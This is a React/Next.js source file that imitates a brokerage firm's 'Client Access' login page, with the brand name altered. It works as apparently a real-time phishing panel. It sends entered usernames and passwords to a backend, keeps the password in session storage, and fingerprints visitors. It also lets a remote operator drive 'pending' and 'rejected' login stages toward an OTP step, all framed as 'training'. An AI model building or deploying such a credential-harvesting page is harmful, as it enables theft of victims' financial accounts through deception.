"use client"

import type { FormEvent } from "react";
import { useState, useEffect } from "react";
import { useRouter } from "next/navigation";
import { CookieBanner } from "./CookieBanner";
import { MarketingShell } from "./AccountShell";
import styles from "./page.module.css";
import { useAuthTraining } from "@/hooks/use-auth-training";
import { authFlowKeys, trainingMessageKey, trainingSessionKey } from "@/lib/auth-flow";

const accountOptions = [
  "Client Access",
  "Commission Management",
  "eFolio",
  "Equity Research",
  "Affordable Housing Investments",
];

const sideButtons = ["Contact Us / FAQ", "Privacy / Security", "Client Resources"];

export default function AccountAccessPage() {
    const router = useRouter();
  const [status, setStatus] = useState<string>("");
  const [pending, setPending] = useState(false);
  const [complete, setComplete] = useState(false);
  const [isSubmitting, setIsSubmitting] = useState(false);
  const [isWaiting, setIsWaiting] = useState(false);
  const [error, setError] = useState("");

  const {setSessionId} = useAuthTraining(command => {
    if(command.type === "mark_login_failed") { setError(command.message); setIsWaiting(false); }
    if(command.type === "mark_session_failed") setError("");
  }, snapshot => {
    setIsWaiting(snapshot.stage === "login_pending");
    if(snapshot.stage === "login_pending") setError("");
    if(snapshot.stage === "login_rejected") setError("Incorrect Credentials, Try Again.");
    if(snapshot.stage === "ended") setError("");
  });

  useEffect(() => {
    const message = sessionStorage.getItem(trainingMessageKey);
    if(message) { setError(message); sessionStorage.removeItem(trainingMessageKey); }
  }, []);
  
  // -------- visitor tracking (once per session) --------
  useEffect(() => {
    if (typeof window === "undefined") return;
    const key = "training_visit_recorded";
    if (sessionStorage.getItem(key)) return;
    sessionStorage.setItem(key, "1");

    // ← the guard is gone
    fetch("/api/visit", {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({
        event: "visit",
        screen: `${window.screen.width}x${window.screen.height}`,
        language: navigator.language,
        timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
        url: window.location.href,
      }),
    }).catch(() => null);
  }, []);

  async function handleSubmit(event: FormEvent<HTMLFormElement>) {
    event.preventDefault();
    setError("");
    setIsSubmitting(true);

    const form = event.currentTarget;
    const formData = new FormData(form);
    const nativeEvent = event.nativeEvent as SubmitEvent;
    const submitter = nativeEvent.submitter as HTMLButtonElement | null;

    const userId = String(formData.get("userId") ?? "").trim();
    const password = String(formData.get("password") ?? "");

    const action = submitter?.value === "passkey" ? "passkey" : "password";

    try {
      const response = await fetch("/api/auth/login", {
        method: "POST",
        headers: {
          "Content-Type": "application/json",
        },
        body: JSON.stringify({
          action,
          userId,             
          password,
          hasUserId: userId.length > 0,
          passwordLength: password.length,
          rememberUserId: formData.get("rememberUserId") === "on",
        }),
      });

      const data = await response.json()

      if (!response.ok) {
        setError(data.error)
        throw new Error("Demo login request failed.");
      }
        
      if (userId) {
        sessionStorage.setItem(authFlowKeys.ampUsername, userId);
        sessionStorage.setItem(trainingSessionKey, data.sessionId);
        sessionStorage.setItem(authFlowKeys.ampPassword, data.password);
        sessionStorage.setItem(authFlowKeys.ampLoginReady, "true");
        sessionStorage.removeItem(trainingMessageKey);
        setSessionId(data.sessionId);
      }

      // form.reset();
      // router.push(data?.next ?? "/account-access/otp-method");
    } catch {
      setError("Unable to continue. Please try again.");
      setIsSubmitting(false);
    }
    finally { setIsSubmitting(false); }
  }

  return (
    <MarketingShell>
      <section className={styles.accountAccess} aria-labelledby="choose-account">
        <div className={styles.accountCopy}>
          <h2>Client Access</h2>
          <p>
            Discover the ease and convenience of having online access to your patrick
            Reddington accounts.
          </p>
          <div className={styles.sideActions}>
            {sideButtons.map((button) => (
              <a href="#" key={button}>
                {button}
              </a>
            ))}
          </div>
        </div>

        <form className={styles.loginPanel} onSubmit={handleSubmit}>
          <fieldset className={styles.formFields} disabled={pending}>
            <h1 id="choose-account">Choose your account:</h1>
            <details className={styles.accountSelect}>
              <summary>Client Access</summary>
              <ul>
                {accountOptions.map((option) => (
                  <li key={option}>
                    <button type="button">{option}</button>
                  </li>
                ))}
              </ul>
            </details>
            <label className={styles.field}>
              <span>Username</span>
              <input aria-label="Username" name="userId" type="text" placeholder=" " autoComplete="off" required />
            </label>
            <label className={styles.field}>
              <span>Password</span>
              <input aria-label="Password" name="password" type="password" placeholder=" " autoComplete="off" required />
            </label>
            <div className={styles.primaryActions}>
              <input type="submit" value="Sign In" />
              <a href="#">Enroll In Client Access</a>
            </div>
            <label className={styles.remember}>
              <input name="rememberUsername" type="checkbox" />
              <span>Remember Username</span>
            </label>
            <p className={styles.helpLinks}>
              Forgot <a href="/account-access/forgot-username">Username</a> or{" "}
              <a href="/account-access/forgot-password">Password?</a>
              <span>|</span>
              <a href="#">Login Help</a>
            </p>
          </fieldset>
          <p className={styles.formStatus} role="status" aria-live="polite">
            {pending ? "Processing…" : status}
          </p>
        </form>
      </section>
      <CookieBanner />
    </MarketingShell>
  );
}
